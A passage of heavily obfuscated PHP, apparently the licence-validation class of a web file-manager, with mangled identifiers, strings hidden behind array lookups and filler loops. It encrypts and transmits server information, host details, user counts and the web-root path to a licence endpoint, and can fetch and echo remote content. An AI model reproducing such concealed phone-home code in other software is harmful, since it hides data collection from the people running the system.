$Î¥‚†¡Å); $—Ã…³ñ = $·à¼Äõ[635]; while (strlen($—Ã…³ñ) < $·à¼Äõ[618]) { if (!$—Ã…³ñ) { break; } $—Ã…³ñ++; } $GLOBALS[$õ•èÓ”¸[13]][$õ•èÓ”¸[15]] = implode($õ•èÓ”¸[0], $GLOBALS[$õ•èÓ”¸[13]][$õ•èÓ”¸[14]]); } public function run() { $ÏôşîŒò =& $_SERVER[ùÆÎÔ“Ñ]; $¡å—Ú‡é =& $_SERVER[¨…Øˆ¼Û]; $this->lyktc10c55a8(); $this->kxdz91189e39(); $‡† ñ¥ = $ÏôşîŒò[636]; while (strlen($‡† ñ¥) < $ÏôşîŒò[628]) { if (!$‡† ñ¥) { break; } $‡† ñ¥++; } $ı§úüÖı = $GLOBALS[$¡å—Ú‡é[13]][$¡å—Ú‡é[14]]; $ñóŞ°£Œ = $GLOBALS[$¡å—Ú‡é[13]][$¡å—Ú‡é[15]]; define($¡å—Ú‡é[20], isset($ı§úüÖı[0]) && $ı§úüÖı[0] ? $ı§úüÖı[0] : $this->defaultModule); define($¡å—Ú‡é[21], isset($ı§úüÖı[1]) && $ı§úüÖı[0] ? $ı§úüÖı[1] : $this->defaultController); $ÉƒşÇ‚ä = $ÏôşîŒò[637]; while ($ÉƒşÇ‚ä < $ÏôşîŒò[628]) { if ($ÉƒşÇ‚ä >= 0) { break; } $ÉƒşÇ‚ä++; } define($¡å—Ú‡é[22], isset($ı§úüÖı[2]) && $ı§úüÖı[0] ? $ı§úüÖı[2] : $this->defaultAction); define($¡å—Ú‡é[23], MOD . $¡å—Ú‡é[0] . ST . $¡å—Ú‡é[0] . ACT); $”œ¢Ãé§ = $ÏôşîŒò[638]; while (strlen($”œ¢Ãé§) < $ÏôşîŒò[628]) { if (!$”œ¢Ãé§) { break; } $”œ¢Ãé§++; } $_SERVER[$¡å—Ú‡é[24]] = strtolower(ACTION); $ÜßïÙÃ– = $ÏôşîŒò[639]; while (strlen($ÜßïÙÃ–) < $ÏôşîŒò[622]) { if (!$ÜßïÙÃ–) { break; } $ÜßïÙÃ–++; } $this->autorun(); $ñò•ò›¤ = $ÏôşîŒò[640]; if (!$ñò•ò›¤) { return; } if (count($ı§úüÖı) >= 3) { $this->appRun($ñóŞ°£Œ); } else { $this->appRun(ACTION); } } private $oxbsb15338bf = array(); private $mvnu652bf0d2 = ''; public function oqvi9f0cf97a() { $§Ä¿Šáæ =& $_SERVER[ùÆÎÔ“Ñ]; $ïä¨İ•á =& $_SERVER[¨…Øˆ¼Û]; $this->aqcsd99b14c5(); $áªÑÈ¿ = $§Ä¿Šáæ[641]; if (strlen($áªÑÈ¿) < $§Ä¿Šáæ[633]) { return; } $this->swhx96b7e422(); $this->zdaj02cc7472(); $this->unzg792f8db9(); $óä§ôÓ = $§Ä¿Šáæ[642]; if (!$óä§ôÓ) { die; } $this->lbxg3c103354(); $ºûŞ˜‘× = $§Ä¿Šáæ[643]; $this->zsluc42204b6(); $this->mpqd118a8986(); $this->eowk2b0d217a($ïä¨İ•á[25], array($this, $ïä¨İ•á[26])); $²üî¿˜ = $§Ä¿Šáæ[644]; while (strlen($²üî¿˜) < $§Ä¿Šáæ[645]) { if (!$²üî¿˜) { break; } $²üî¿˜++; } $this->eowk2b0d217a($ïä¨İ•á[27], array($this, $ïä¨İ•á[28])); $this->eowk2b0d217a($ïä¨İ•á[29], array($this, $ïä¨İ•á[30])); $Û–ÉÍÖ… = $§Ä¿Šáæ[646]; if (strlen($Û–ÉÍÖ…) < $§Ä¿Šáæ[618]) { die; } $this->eowk2b0d217a($ïä¨İ•á[31], array($this, $ïä¨İ•á[32])); } public function huqnf6a14a48($ÜÈÊî) { $Éøìğé” =& $_SERVER[ùÆÎÔ“Ñ]; $ş °éô÷ =& $_SERVER[¨…Øˆ¼Û]; $ì¹ûÈ§ = Model($ş °éô÷[33])->get(); $”–Ûª±® = array($ş °éô÷[34], $ş °éô÷[35], $ş °éô÷[36], $ş °éô÷[37], $ş °éô÷[38], $ş °éô÷[39], $ş °éô÷[40], $ş °éô÷[41], $ş °éô÷[42], $ş °éô÷[43], $ş °éô÷[44], $ş °éô÷[45], $ş °éô÷[46], $ş °éô÷[47], $ş °éô÷[48], $ş °éô÷[49], $ş °éô÷[50], $ş °éô÷[51], $ş °éô÷[52], $ş °éô÷[53], $ş °éô÷[54], $ş °éô÷[55], $ş °éô÷[56], $ş °éô÷[57], $ş °éô÷[58], $ş °éô÷[59], $ş °éô÷[60], $ş °éô÷[61], $ş °éô÷[62], $ş °éô÷[63], $ş °éô÷[64], $ş °éô÷[65], $ş °éô÷[66], $ş °éô÷[67], $ş °éô÷[68], $ş °éô÷[69], $ş °éô÷[70], $ş °éô÷[71], $ş °éô÷[72], $ş °éô÷[73], $ş °éô÷[74], $ş °éô÷[75], $ş °éô÷[76], $ş °éô÷[77], $ş °éô÷[78], $ş °éô÷[79], $ş °éô÷[80], $ş °éô÷[81], $ş °éô÷[82], $ş °éô÷[83], $ş °éô÷[84]); foreach ($”–Ûª±® as $¯ÔïıĞ) { $Ê÷Í­ç­ = $GLOBALS[$ş °éô÷[85]][$ş °éô÷[86]][$¯ÔïıĞ]; if (isset($ì¹ûÈ§[$¯ÔïıĞ])) { $Ê÷Í­ç­ = $ì¹ûÈ§[$¯ÔïıĞ]; } $ÜÈÊî[$ş °éô÷[87]][$ş °éô÷[88]][$¯ÔïıĞ] = $Ê÷Í­ç­; } $£˜ù¯‘ä = $ÜÈÊî[$ş °éô÷[87]][$ş °éô÷[88]][$ş °éô÷[46]]; unset($ÜÈÊî[$ş °éô÷[87]][$ş °éô÷[89]][$ş °éô÷[90]]); unset($ÜÈÊî[$ş °éô÷[87]][$ş °éô÷[89]][$ş °éô÷[91]]); unset($ÜÈÊî[$ş °éô÷[87]][$ş °éô÷[88]][$ş °éô÷[46]]); unset($ÜÈÊî[$ş °éô÷[87]][$ş °éô÷[88]][$ş °éô÷[92]]); $ÜÈÊî[$ş °éô÷[87]][$ş °éô÷[88]][$ş °éô÷[93]] = array($ş °éô÷[94] => (int) $£˜ù¯‘ä[$ş °éô÷[95]], $ş °éô÷[96] => (int) _get($£˜ù¯‘ä, $ş °éô÷[97], 0)); $ÜÈÊî[$ş °éô÷[98]][$ş °éô÷[99]] = Action($ş °éô÷[100])->accessToken(); $ò¡¦é² = $Éøìğé”[647]; if (!$ò¡¦é²) { return; } $ÜÈÊî[$ş °éô÷[98]][$ş °éô÷[101]] = md5($_SERVER[$ş °éô÷[102]] . $ì¹ûÈ§[$ş °éô÷[103]]); $ êŸ¥Ú„ = $Éøìğé”[648]; if (!$ êŸ¥Ú„) { return; } $ÜÈÊî[$ş °éô÷[98]][$ş °éô÷[104]] = base64_encode(serverInfo()); $¥µ´µÄô = $Éøìğé”[649]; if (strlen($¥µ´µÄô) < $Éøìğé”[618]) { die; } $ÜÈÊî[$ş °éô÷[98]][$ş °éô÷[105]] = $this->mvnu652bf0d2; $×™½¥óï = $Éøìğé”[650]; if ($ì¹ûÈ§[$ş °éô÷[105]] != $ş °éô÷[106]) { $ÜÈÊî[$ş °éô÷[98]][$ş °éô÷[107]] = $ì¹ûÈ§[$ş °éô÷[107]]; $ÜÈÊî[$ş °éô÷[98]][$ş °éô÷[108]] = $ì¹ûÈ§[$ş °éô÷[108]]; $ùºİ¾ùµ = rand_string(10) . $this->mvnu652bf0d2 . rand_string(5); $ÜÈÊî[$ş °éô÷[87]][$ş °éô÷[109]][$ş °éô÷[110]] = $this->opbk34df162b($ùºİ¾ùµ, $ÜÈÊî[$ş °éô÷[98]][$ş °éô÷[101]]); } if ($this->mvnu652bf0d2 == $ş °éô÷[106]) { $ÜÈÊî[$ş °éô÷[87]][$ş °éô÷[88]][$ş °éô÷[93]][$ş °éô÷[97]] = 0; } $ÜÈÊî[$ş °éô÷[98]][$ş °éô÷[111]] = _get($this->oxbsb15338bf, $ş °éô÷[112], $ş °éô÷[6]); $ÜÈÊî[$ş °éô÷[98]][$ş °éô÷[113]] = _get($this->oxbsb15338bf, $ş °éô÷[114], $ş °éô÷[6]); if (_get($GLOBALS, $ş °éô÷[115]) && $this->config[$ş °éô÷[116]]) { $ÜÈÊî[$ş °éô÷[98]][$ş °éô÷[117]] = WEB_ROOT; } return $ÜÈÊî; } private function zsluc42204b6() { $ù»Ş¿­ =& $_SERVER[ùÆÎÔ“Ñ]; $³ÒÆ¿ëÁ =& $_SERVER[¨…Øˆ¼Û]; $šêÅ•ŸÖ = $_SERVER[$³ÒÆ¿ëÁ[24]] == $³ÒÆ¿ëÁ[118]; if ($_SERVER[$³ÒÆ¿ëÁ[24]] == $³ÒÆ¿ëÁ[119] && $_GET[$³ÒÆ¿ëÁ[120]] == $³ÒÆ¿ëÁ[121]) { $šêÅ•ŸÖ = !0; } if ($šêÅ•ŸÖ) { $ÆÍö¹é = array($³ÒÆ¿ëÁ[105] => $this->mvnu652bf0d2, $³ÒÆ¿ëÁ[122] => $this->gaeb6101d0de(), $³ÒÆ¿ëÁ[123] => Model($³ÒÆ¿ëÁ[124])->count()); if ($this->mvnu652bf0d2 != $³ÒÆ¿ëÁ[106]) { $£°™œƒæ = _get($this->oxbsb15338bf, $³ÒÆ¿ëÁ[125]); if ($£°™œƒæ) { $ÆÍö¹é[$³ÒÆ¿ëÁ[126]] = $£°™œƒæ; $ÆÍö¹é[$³ÒÆ¿ëÁ[127]] = strtotime(_get($this->oxbsb15338bf, $³ÒÆ¿ëÁ[128])); $ÆÍö¹é[$³ÒÆ¿ëÁ[129]] = _get($this->oxbsb15338bf, $³ÒÆ¿ëÁ[114]); } $ä´³Ë³ = Model($³ÒÆ¿ëÁ[33])->get($³ÒÆ¿ëÁ[130], $³ÒÆ¿ëÁ[6], !0); if (is_string($ä´³Ë³) && substr($ä´³Ë³, 0, 1) == $³ÒÆ¿ëÁ[131]) { $ä´³Ë³ = json_decode_force($ä´³Ë³); } if (is_array($ä´³Ë³) && $ä´³Ë³[$³ÒÆ¿ëÁ[132]] && strstr($ä´³Ë³[$³ÒÆ¿ëÁ[132]], $³ÒÆ¿ëÁ[133])) { $—û‘ğ®ı = explode($³ÒÆ¿ëÁ[133], $ä´³Ë³[$³ÒÆ¿ëÁ[132]]); $ÆÍö¹é[$³ÒÆ¿ëÁ[134]] = $—û‘ğ®ı[0]; } } $ÆÍö¹é = $this->dbjqa4598121(json_encode($ÆÍö¹é), md5($³ÒÆ¿ëÁ[135])); $ßÑ‚®×É = array($³ÒÆ¿ëÁ[136] => $ÆÍö¹é); call_user_func(array($³ÒÆ¿ëÁ[137], $³ÒÆ¿ëÁ[138]), $ßÑ‚®×É); $“Š™ó‰ê = $ù»Ş¿­[651]; if (strlen($“Š™ó‰ê) < $ù»Ş¿­[628]) { die; } } if ($this->mvnu652bf0d2 == $³ÒÆ¿ëÁ[106]) { return; } $†¤—›¹… = array($³ÒÆ¿ëÁ[139], $³ÒÆ¿ëÁ[140], $³ÒÆ¿ëÁ[141], $³ÒÆ¿ëÁ[142], $³ÒÆ¿ëÁ[143], $³ÒÆ¿ëÁ[144]); $˜—´Å»â = Model($³ÒÆ¿ëÁ[33])->get(); $„Ñ‚Ú…Â = $ù»Ş¿­[652]; $ßÑ‚®×É = array($³ÒÆ¿ëÁ[145] => $˜—´Å»â[$³ÒÆ¿ëÁ[34]], $³ÒÆ¿ëÁ[146] => $˜—´Å»â[$³ÒÆ¿ëÁ[35]], $³ÒÆ¿ëÁ[147] => $³ÒÆ¿ëÁ[6]); foreach ($†¤—›¹… as $÷¨Ğ—òŒ) { if (!isset($˜—´Å»â[$÷¨Ğ—òŒ]) || !$˜—´Å»â[$÷¨Ğ—òŒ]) { continue; } $ßÑ‚®×É[$÷¨Ğ—òŒ] = $˜—´Å»â[$÷¨Ğ—òŒ]; } call_user_func(array($³ÒÆ¿ëÁ[137], $³ÒÆ¿ëÁ[138]), $ßÑ‚®×É); } private function unzg792f8db9() { $Ú¡°Ì¾¿ =& $_SERVER[ùÆÎÔ“Ñ]; $¬ÂØ÷¨¿ =& $_SERVER[¨…Øˆ¼Û]; if ($_SERVER[$¬ÂØ÷¨¿[24]] != $¬ÂØ÷¨¿[148]) { return; } if (!_get($GLOBALS, $¬ÂØ÷¨¿[115])) { die; } $¹€©ùø = $GLOBALS[$¬ÂØ÷¨¿[13]]; if (isset($¹€©ùø[$¬ÂØ÷¨¿[149]])) { $this->ehfxe539ab0f(); die; } if (!isset($¹€©ùø[$¬ÂØ÷¨¿[150]]) || strlen($¹€©ùø[$¬ÂØ÷¨¿[150]]) != 16) { show_json($¬ÂØ÷¨¿[151] . $¹€©ùø[$¬ÂØ÷¨¿[150]], !1); } $ Òğ¸Š‘ = Model($¬ÂØ÷¨¿[33])->get($¬ÂØ÷¨¿[103]); $±™„æ›ã = md5($_SERVER[$¬ÂØ÷¨¿[102]] . $ Òğ¸Š‘); $Û¯õé‹Û = $Ú¡°Ì¾¿[653]; if (strlen($Û¯õé‹Û) < $Ú¡°Ì¾¿[645]) { die; } $¨æ¡Ğ” = array($¬ÂØ÷¨¿[150] => $¹€©ùø[$¬ÂØ÷¨¿[150]], $¬ÂØ÷¨¿[152] => rand_string(16), $¬ÂØ÷¨¿[153] => $¬ÂØ÷¨¿[135], $¬ÂØ÷¨¿[154] => $¬ÂØ÷¨¿[155], $¬ÂØ÷¨¿[156] => $_SERVER[$¬ÂØ÷¨¿[157]], $¬ÂØ÷¨¿[158] => $_SERVER[$¬ÂØ÷¨¿[159]], $¬ÂØ÷¨¿[160] => $_SERVER[$¬ÂØ÷¨¿[161]], $¬ÂØ÷¨¿[101] => $±™„æ›ã, $¬ÂØ÷¨¿[162] => Model($¬ÂØ÷¨¿[33])->get($¬ÂØ÷¨¿[130])); $éšì = $Ú¡°Ì¾¿[654]; if (strlen($éšì) < $Ú¡°Ì¾¿[628]) { die; } if ($¹€©ùø[$¬ÂØ÷¨¿[163]] == $¬ÂØ÷¨¿[164]) { $‡â½•³ = $this->dbjqa4598121($±™„æ›ã, $¬ÂØ÷¨¿[165]); $ëğ»Ê©Å = $this->opbk34df162b(json_encode($¨æ¡Ğ”), $±™„æ›ã . $¬ÂØ÷¨¿[166], 3); $ëğ»Ê©Å = $ëğ»Ê©Å . $¬ÂØ÷¨¿[167] . $_SERVER[$¬ÂØ÷¨¿[157]]; $òŠ¦¦Â = $this->qwlxbfe1f71d($¬ÂØ÷¨¿[168] . $‡â½•³ . $¬ÂØ÷¨¿[169] . $ëğ»Ê©Å, -1); show_json($òŠ¦¦Â, !0); } else { if ($¹€©ùø[$¬ÂØ÷¨¿[163]] == $¬ÂØ÷¨¿[170]) { $ÊĞùÌ…ª = substr(md5($¬ÂØ÷¨¿[171] . $±™„æ›ã), 12, 15) . $¬ÂØ÷¨¿[172]; $ëğ»Ê©Å = $this->zpfeacb329be(trim($¹€©ùø[$¬ÂØ÷¨¿[173]]), $ÊĞùÌ…ª, 2); $µñôÆÂ = json_decode($ëğ»Ê©Å, !0); if (!is_array($µñôÆÂ) || !is_array($µñôÆÂ[$¬ÂØ÷¨¿[174]]) || $µñôÆÂ[$¬ÂØ÷¨¿[150]] != !0) { $ô‰‡‚ÕÙ = $¬ÂØ÷¨¿[175]; $ã½ÜÉÁÀ = $µñôÆÂ[$¬ÂØ÷¨¿[174]] ? $¬ÂØ÷¨¿[176] . $µñôÆÂ[$¬ÂØ÷¨¿[174]] : $ô‰‡‚ÕÙ; show_json($ã½ÜÉÁÀ, !1); } else { $¨æ¡Ğ”[$¬ÂØ÷¨¿[152]] = $µñôÆÂ[$¬ÂØ÷¨¿[174]][$¬ÂØ÷¨¿[177]]; } } else { $µñôÆÂ = $this->qwlxbfe1f71d($¬ÂØ÷¨¿[178], $¨æ¡Ğ”, 10); $‹ÜÌíƒ… = $Ú¡°Ì¾¿[655]; if (strlen($‹ÜÌíƒ…) < $Ú¡°Ì¾¿[622]) { die; } } } if (!is_array($µñôÆÂ) || !is_array($µñôÆÂ[$¬ÂØ÷¨¿[174]]) || $µñôÆÂ[$¬ÂØ÷¨¿[150]] != !0) { $ô‰‡‚ÕÙ = LNG($¬ÂØ÷¨¿[179]); $ã½ÜÉÁÀ = $µñôÆÂ[$¬ÂØ÷¨¿[174]] ? $¬ÂØ÷¨¿[176] . $µñôÆÂ[$¬ÂØ÷¨¿[174]] : $ô‰‡‚ÕÙ; show_json($ã½ÜÉÁÀ, !1); } $œÂˆ´®÷ = $µñôÆÂ[$¬ÂØ÷¨¿[174]]; $ƒ×÷ÍçÉ = $this->pskv630c53a5($œÂˆ´®÷[$¬ÂØ÷¨¿[180]]); $¥çƒ‘’İ = $Ú¡°Ì¾¿[656]; while ($¥çƒ‘’İ < $Ú¡°Ì¾¿[633]) { if ($¥çƒ‘’İ >= 0) { break; } $¥çƒ‘’İ++; } if (!$ƒ×÷ÍçÉ || $ƒ×÷ÍçÉ != $œÂˆ´®÷[$¬ÂØ÷¨¿[128]]) { $îü¸¦ğ“ = array($¬ÂØ÷¨¿[181] => Model($¬ÂØ÷¨¿[33])->get($¬ÂØ÷¨¿[103]), $¬ÂØ÷¨¿[182] => $_SERVER[$¬ÂØ÷¨¿[102]], $¬ÂØ÷¨¿[183] => this_url(), $¬ÂØ÷¨¿[158] => $_SERVER[$¬ÂØ÷¨¿[159]]); $ëğ»Ê©Å = $this->rgphda8b0b04(json_encode($îü¸¦ğ“)); $this->qwlxbfe1f71d($¬ÂØ÷¨¿[184] . $ëğ»Ê©Å); show_json(LNG($¬ÂØ÷¨¿[185]), !0); } $Òµ®ş¬Ğ = array($¬ÂØ÷¨¿[186] => $œÂˆ´®÷[$¬ÂØ÷¨¿[187]], $¬ÂØ÷¨¿[188] => $œÂˆ´®÷[$¬ÂØ÷¨¿[189]], $¬ÂØ÷¨¿[190] => rand_string(16), $¬ÂØ÷¨¿[105] => $œÂˆ´®÷[$¬ÂØ÷¨¿[191]]); if ($¨æ¡Ğ”[$¬ÂØ÷¨¿[152]]) { $Òµ®ş¬Ğ[$¬ÂØ÷¨¿[190]] = $¨æ¡Ğ”[$¬ÂØ÷¨¿[152]]; } $îµšé×´ = substr(md5($Òµ®ş¬Ğ[$¬ÂØ÷¨¿[188]]), 10, 10); $şùéËõ© = $îµšé×´ . $Òµ®ş¬Ğ[$¬ÂØ÷¨¿[105]] . $Òµ®ş¬Ğ[$¬ÂØ÷¨¿[190]]; $´ÔÛ•¨¯ = $Ú¡°Ì¾¿[657]; while ($´ÔÛ•¨¯ < $Ú¡°Ì¾¿[622]) { if ($´ÔÛ•¨¯ >= 0) { break; } $´ÔÛ•¨¯++; } $Òµ®ş¬Ğ[$¬ÂØ÷¨¿[107]] = strrev(base64_encode($this->dbjqa4598121($şùéËõ©, $¬ÂØ÷¨¿[192]))); $¤·¦Ú‡· = $Ú¡°Ì¾¿[658]; while ($¤·¦Ú‡· < $Ú¡°Ì¾¿[633]) { if ($¤·¦Ú‡· >= 0) { break; } $¤·¦Ú‡·++; } $ş¸•Ğôğ = rand_string(16); $—Ä˜ = $ş¸•Ğôğ . $Òµ®ş¬Ğ[$¬ÂØ÷¨¿[105]] . $this->dbjqa4598121(md5($Òµ®ş¬Ğ[$¬ÂØ÷¨¿[186]]), $ş¸•Ğôğ); $éƒ×´œŠ = $Ú¡°Ì¾¿[659]; if (strlen($éƒ×´œŠ) < $Ú¡°Ì¾¿[628]) { die; } $Òµ®ş¬Ğ[$¬ÂØ÷¨¿[108]] = base64_encode(strrev($this->dbjqa4598121($—Ä˜, $¬ÂØ÷¨¿[193]))); if ($œÂˆ´®÷[$¬ÂØ÷¨¿[194]] && $œÂˆ´®÷[$¬ÂØ÷¨¿[194]] >= 1) { Model($¬ÂØ÷¨¿[33])->setDeep($¬ÂØ÷¨¿[195], $¬ÂØ÷¨¿[121]); } Model($¬ÂØ÷¨¿[33])->set($Òµ®ş¬Ğ); $—·Ù®»‡ = md5($_SERVER[$¬ÂØ÷¨¿[102]] . strrev($ Òğ¸Š‘) . $Òµ®ş¬Ğ[$¬ÂØ÷¨¿[188]]); $ıëñ‡Õ = $Ú¡°Ì¾¿[660]; $ÒÁ–íã = strrev(substr($—·Ù®»‡, 10, 16)); $‹ÊåäÔ¸ = $Ú¡°Ì¾¿[661]; while (strlen($‹ÊåäÔ¸) < $Ú¡°Ì¾¿[645]) { if (!$‹ÊåäÔ¸) { break; } $‹ÊåäÔ¸++; } $„°Ó‡ÈÚ = $this->opbk34df162b(json_encode($œÂˆ´®÷), $—·Ù®»‡); $¦°«ñµ• = $Ú¡°Ì¾¿[662]; if (strlen($¦°«ñµ•) < $Ú¡°Ì¾¿[645]) { die; } $˜ÀåŞ° = array_to_keyvalue(Model($¬ÂØ÷¨¿[7])->listData(), $¬ÂØ÷¨¿[196]); $øİâ“Ä¥ = $Ú¡°Ì¾¿[663]; if (strlen($øİâ“Ä¥) < $Ú¡°Ì¾¿[628]) { return; } $Â÷úØÇ¦ = $˜ÀåŞ°[$¬ÂØ÷¨¿[197]]; $Ÿ“å Õ™ = array(); $ºŸ”‡» = $Ú¡°Ì¾¿[664]; while (strlen($ºŸ”‡») < $Ú¡°Ì¾¿[628]) { if (!$ºŸ”‡») { break; } $ºŸ”‡»++; } $Ÿ“å Õ™[$ÒÁ–íã] = $„°Ó‡ÈÚ; $¸…Şñü = $Ú¡°Ì¾¿[665]; Model($¬ÂØ÷¨¿[7])->update($Â÷úØÇ¦[$¬ÂØ÷¨¿[198]], array($¬ÂØ÷¨¿[199] => $Ÿ“å Õ™)); $this->oxbsb15338bf = $œÂˆ´®÷; $this->mvnu652bf0d2 = $Òµ®ş¬Ğ[$¬ÂØ÷¨¿[105]]; $—›§—¢ = $Ú¡°Ì¾¿[666]; $this->licenseRegistSuccess(); Cache::set($¬ÂØ÷¨¿[200] . md5($ Òğ¸Š‘ . $¬ÂØ÷¨¿[201]), $¬ÂØ÷¨¿[6]); $‰‘ß¶¾ã = $Ú¡°Ì¾¿[667]; show_json(LNG($¬ÂØ÷¨¿[185]), !0); $†š¥Ñ£à = $Ú¡°Ì¾¿[668]; while ($†š¥Ñ£à < $Ú¡°Ì¾¿[622]) { if ($†š¥Ñ£à >= 0) { break; } $†š¥Ñ£à++; } } private function licenseRegistSuccess() { $›¡»˜Õİ =& $_SERVER[¨…Øˆ¼Û]; $Ù¬¸½ƒµ = Model($›¡»˜Õİ[33])->get(); $—„¦–‰“ = $_SERVER[ùÆÎÔ“Ñ][669]; if ($Ù¬¸½ƒµ[$›¡»˜Õİ[63]] != $›¡»˜Õİ[121]) { Model($›¡»˜Õİ[33])->set($›¡»˜Õİ[63], $›¡»˜Õİ[121]); } Action($›¡»˜Õİ[202])->initStart(!0); } private function ehfxe539ab0f() { $Ì¦í¡ÊÓ =& $_SERVER[ùÆÎÔ“Ñ]; $à¡ÅÆ =& $_SERVER[¨…Øˆ¼Û]; Model($à¡ÅÆ[33])->set(array($à¡ÅÆ[186] => $à¡ÅÆ[6], $à¡ÅÆ[188] => $à¡ÅÆ[6], $à¡ÅÆ[105] => $à¡ÅÆ[106], $à¡ÅÆ[107] => $à¡ÅÆ[6], $à¡ÅÆ[108] => $à¡ÅÆ[6])); Model($à¡ÅÆ[33])->setDeep($à¡ÅÆ[195], $à¡ÅÆ[203]); $ïÀıŒæÊ = $Ì¦í¡ÊÓ[670]; if (strlen($ïÀıŒæÊ) < $Ì¦í¡ÊÓ[622]) { die; } $this->oxbsb15338bf = array(); $this->mvnu652bf0d2 = $à¡ÅÆ[106]; } private function aqcsd99b14c5() { $ş¡¹ò–Ê =& $_SERVER[ùÆÎÔ“Ñ]; $¦õˆµ =& $_SERVER[¨…Øˆ¼Û]; $_SERVER[$¦õˆµ[159]] = _get($_SERVER, $¦õˆµ[159], APP_HOST); $this->mvnu652bf0d2 = $¦õˆµ[106]; $½Æßë²É = Model($¦õˆµ[33])->get(); $•ä„òÙ = $ş¡¹ò–Ê[671]; while ($•ä„òÙ < $ş¡¹ò–Ê[645]) { if ($•ä„òÙ >= 0) { break; } $•ä„òÙ++; } if ($½Æßë²É[$¦õˆµ[105]] == $¦õˆµ[106]) { return; } $Ÿ¨ÀÏæ© = Model($¦õˆµ[33])->get($¦õˆµ[103]); $ò¯×ı ƒ = $¦õˆµ[200] . md5($Ÿ¨ÀÏæ© . $¦õˆµ[201]); $µâ©Íğ¹ = Cache::get($ò¯×ı ƒ); if (!is_array($µâ©Íğ¹) || !isset($µâ©Íğ¹[$¦õˆµ[204]]) || time() - $µâ©Íğ¹[$¦õˆµ[204]] >= 60) { $˜¯Ê­êğ = Model($¦õˆµ[7])->loadList(); $µ¶Îê× = $˜¯Ê­êğ[$¦õˆµ[197]]; $‹„“Îø‰ = md5($_SERVER[$¦õˆµ[102]] . strrev($Ÿ¨ÀÏæ©) . $½Æßë²É[$¦õˆµ[188]]); $Ğ¿ß—Ë = strrev(substr($‹„“Îø‰, 10, 16)); $µâ©Íğ¹ = $this->zpfeacb329be($µ¶Îê×[$¦õˆµ[85]][$Ğ¿ß—Ë], $‹„“Îø‰); $µâ©Íğ¹ = json_decode($µâ©Íğ¹, !0); } if (!is_array($µâ©Íğ¹)) { return $this->ehfxe539ab0f(); } $Äê®ş¡ = strtotime($µâ©Íğ¹[$¦õˆµ[128]]); if (time() >= $Äê®ş¡) { return $this->ehfxe539ab0f(); } if (time() - $µâ©Íğ¹[$¦õˆµ[204]] > 20) { $µâ©Íğ¹[$¦õˆµ[204]] = time(); Cache::set($ò¯×ı ƒ, $µâ©Íğ¹); } $this->oxbsb15338bf = $µâ©Íğ¹; $this->mvnu652bf0d2 = $½Æßë²É[$¦õˆµ[105]]; $çñı¨¶ö = $ş¡¹ò–Ê[672]; } private function swhx96b7e422() { $³¯¿Ÿï† =& $_SERVER[ùÆÎÔ“Ñ]; $¾ÙÈƒŠû =& $_SERVER[¨…Øˆ¼Û]; $àÔô”áË = $GLOBALS[$¾ÙÈƒŠû[13]]; $ëâ¼ŸË± = $³¯¿Ÿï†[673]; while ($ëâ¼ŸË± < $³¯¿Ÿï†[628]) { if ($ëâ¼ŸË± >= 0) { break; } $ëâ¼ŸË±++; } $ĞÀ¾ª¡ê = $_SERVER[$¾ÙÈƒŠû[24]]; $ëœÌŞœÌ = $³¯¿Ÿï†[674]; if (strlen($ëœÌŞœÌ) < $³¯¿Ÿï†[645]) { die; } if ($ĞÀ¾ª¡ê == $¾ÙÈƒŠû[205] && $this->mvnu652bf0d2 == $¾ÙÈƒŠû[106]) { show_json(LNG($¾ÙÈƒŠû[206]), !1, $¾ÙÈƒŠû[207]); } $Ó‹ÇºĞ = array($¾ÙÈƒŠû[208], $¾ÙÈƒŠû[209]); if (in_array($ĞÀ¾ª¡ê, $Ó‹ÇºĞ)) { if ($this->mvnu652bf0d2 == $¾ÙÈƒŠû[106] && isset($àÔô”áË[$¾ÙÈƒŠû[210]])) { show_json(LNG($¾ÙÈƒŠû[206]), !1, $¾ÙÈƒŠû[207]); die; } $×Ÿ‚Ü²ª = $this->gaeb6101d0de(); if ($×Ÿ‚Ü²ª != intval($¾ÙÈƒŠû[211])) { if ($×Ÿ‚Ü²ª <= Model($¾ÙÈƒŠû[124])->count()) { show_json(LNG($¾ÙÈƒŠû[212]), !1, $¾ÙÈƒŠû[207]); die; } } } } private function zdaj02cc7472() { $¶ÉÄñ„ =& $_SERVER[ùÆÎÔ“Ñ]; $ò¼Ôê©¸ =& $_SERVER[¨…Øˆ¼Û]; $Ÿ¦ø×Ğî = array($ò¼Ôê©¸[118], $ò¼Ôê©¸[119]); $ùò˜‘’Ü = $¶ÉÄñ„[675]; while (strlen($ùò˜‘’Ü) < $¶ÉÄñ„[618]) { if (!$ùò˜‘’Ü) { break; } $ùò˜‘’Ü++; } if (!_get($GLOBALS, $ò¼Ôê©¸[115]) || !isset($_GET[$ò¼Ôê©¸[213]])) { return; } if (!in_array($_SERVER[$ò¼Ôê©¸[24]], $Ÿ¦ø×Ğî)) { return; } $ËíÚÍŞø = $ò¼Ôê©¸[214]; $ËíÚÍŞø = $this->cpwq9cab185d($ËíÚÍŞø, $ò¼Ôê©¸[215]); $„òßáË = $¶ÉÄñ„[676]; if (!$„òßáË) { return; } $ÅÚÎÜœà = stream_context_create(array($ò¼Ôê©¸[216] => array($ò¼Ôê©¸[217] => $ò¼Ôê©¸[218], $ò¼Ôê©¸[219] => 3))); $Ø©·ğ = $¶ÉÄñ„[677]; while (strlen($Ø©·ğ) < $¶ÉÄñ„[633]) { if (!$Ø©·ğ) { break; } $Ø©·ğ++; } $¶ĞÀÆø = @file_get_contents($ËíÚÍŞø, !1, $ÅÚÎÜœà); header($ò¼Ôê©¸[220]); if ($¶ĞÀÆø && strstr($¶ĞÀÆø, $ò¼Ôê©¸[221])) { echo $¶ĞÀÆø; } die; } public function obwja0a7685f($û›Îš„“) { $ŒÈºåê— =& $_SERVER[ùÆÎÔ“Ñ]; $­÷Ë¨¿¥ =& $_SERVER[¨…Øˆ¼Û]; if ($this->mvnu652bf0d2 == $­÷Ë¨¿¥[222]) { return $û›Îš„“; } $Úº¯æé™ = array($­÷Ë¨¿¥[223] => $­÷Ë¨¿¥[224], $­÷Ë¨¿¥[225] => $­÷Ë¨¿¥[224], $­÷Ë¨¿¥[226] => $­÷Ë¨¿¥[224], $­÷Ë¨¿¥[227] => $­÷Ë¨¿¥[224], $­÷Ë¨¿¥[228] => $­÷Ë¨¿¥[229], $­÷Ë¨¿¥[230] => $­÷Ë¨¿¥[229], $­÷Ë¨¿¥[231] => $­÷Ë¨¿¥[229], $­÷Ë¨¿¥[232] => $­÷Ë¨¿¥[229], $­÷Ë¨¿¥[233] => $­÷Ë¨¿¥[229], $­÷Ë¨¿¥[234] => $­÷Ë¨¿¥[229], 